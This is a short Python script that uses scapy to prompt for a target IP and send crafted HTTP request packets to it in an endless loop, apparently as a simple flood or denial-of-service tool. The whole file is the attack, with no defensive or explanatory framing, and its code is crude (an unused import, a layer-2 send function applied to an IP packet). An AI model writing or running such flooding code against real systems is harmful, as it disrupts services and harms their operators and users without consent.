from scapy.all import *
from scapy.layers.http import HTTPRequest
from colorama import init, Fore
ip = input("insert target ip: ")
pkt=IP(dst=ip)/HTTPRequest()
try:
   while True:
      sendp(pkt)
except:
   print("\nexit")
